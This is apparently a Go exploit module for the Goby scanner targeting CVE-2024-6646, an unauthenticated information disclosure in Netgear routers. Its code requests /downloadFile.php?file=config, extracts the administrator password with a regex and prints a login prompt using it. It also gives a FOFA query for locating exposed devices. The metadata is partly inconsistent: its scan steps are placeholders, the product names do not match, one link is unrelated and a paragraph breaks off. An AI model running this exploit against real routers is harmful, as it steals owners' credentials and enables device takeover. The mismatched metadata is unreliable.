package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Netgear multiple versions /downloadFile.php Information Disclosure Vulnerability(CVE-2024-6646)",
    "Description": "<p>Netgear routers: An information disclosure vulnerability exists in the downloadFile.php interface of the management backend across multiple versions. An unauthenticated remote attacker can exploit this vulnerability to obtain the administrator's account and password information for the wireless router, potentially leading to control of the router's backend. This allows the attacker to disrupt the wireless network or pose further threats.</p>",
    "Product": "NETGEAR-WNR614",
    "Homepage": "https://www.netgear.com/fr/support/product/wn604/",
    "DisclosureDate": "2024-07-22",
    "PostTime": "2024-08-01",
    "Author": "1538279017@qq.com",
    "FofaQuery": "title==\"Netgear\" && (server==\"lighttpd/1.4.18\" || server==\"Boa/0.94.13\" || server==\"lighttpd/1.4.23\")",
    "GobyQuery": "title==\"Netgear\" && (server==\"lighttpd/1.4.18\" || server==\"Boa/0.94.13\" || server==\"lighttpd/1.4.23\")",
    "Level": "2",
    "Impact": "<p>Identity Theft and Fraud: Personal data leaks can lead to identity theft, where malicious actors use stolen information to commit fraud, open accounts, or make unauthorized purchases, causing financial and reputational harm to the victims.National Security Risks: Sensitive information related to national security, defense, or critical infrastructure can pose significant threats if leaked, potentially leading to espionage, sabotage, or other forms of national security breaches.Personal Safety Risks: In cases where sensitive personal information like home addresses</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/sylabs/sif2.\"></a><a href=\"https://www.netgear.com/fr/support/product/wn604/.\">https://www.netgear.com/fr/support/product/wn604/.</a>Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/m0_60571842/article/details/140528701"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Config",
            "type": "select",
            "value": "config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2024-6646"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "Netgear 路由器多版本管理后台 downloadFile.php 信息泄露漏洞(CVE-2024-6646)",
            "Product": "NETGEAR-WNR604",
            "Description": "<p>Netgear 路由器多版本管理后台downloadFile.php接口处存在信息泄露漏洞，未经身份验证的远程攻击者可以利用此漏洞获取无线路由器的管理员账号密码信息，导致路由器后台被控，攻击者可对无线网络发起破坏或进一步威胁。<br></p>",
            "Recommendation": "<p>1.增加对该路径接口的鉴权方案,或者禁止该接口的随意调用</p><p>2.通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>Netgear 路由器多版本管理后台 downloadFile.php接口处存在信息泄露漏洞，未经身份验证的远程攻击者可以利用此漏洞获取无线路由器的管理员账号密码信息，导致路由器后台被控，攻击者可对无线网络发起破坏或进一步威胁。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Netgear multiple versions /downloadFile.php Information Disclosure Vulnerability(CVE-2024-6646)",
            "Product": "NETGEAR-WNR614",
            "Description": "<p>Netgear routers: An information disclosure vulnerability exists in the downloadFile.php interface of the management backend across multiple versions. An unauthenticated remote attacker can exploit this vulnerability to obtain the administrator's account and password information for the wireless router, potentially leading to control of the router's backend. This allows the attacker to disrupt the wireless network or pose further threats.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/sylabs/sif2.\"></a><a href=\"https://www.netgear.com/fr/support/product/wn604/.\">https://www.netgear.com/fr/support/product/wn604/.</a>Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Identity Theft and Fraud: Personal data leaks can lead to identity theft, where malicious actors use stolen information to commit fraud, open accounts, or make unauthorized purchases, causing financial and reputational harm to the victims.<br>National Security Risks: Sensitive information related to national security, defense, or critical infrastructure can pose significant threats if leaked, potentially leading to espionage, sabotage, or other forms of national security breaches.<br>Personal Safety Risks: In cases where sensitive personal information like home addresses<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10984"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/downloadFile.php?file=" + fileUrl
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/downloadFile.php?file="

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"config": "adminPasswd",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["Config"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"config": {"config", "adminPasswd"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true
			re := regexp.MustCompile(`system:basicSettings:adminPasswd\s+(\S+)`)
			matches := re.FindAllStringSubmatch(resp, -1)
			for _, match := range matches {
				if len(match) > 1 {
					expResult.Output = "Extracted password: " + match[1] + "\n" + "Please use admin:" + match[1] + " to login!" + "\n"
				}
			}
			return expResult

		},
	))
}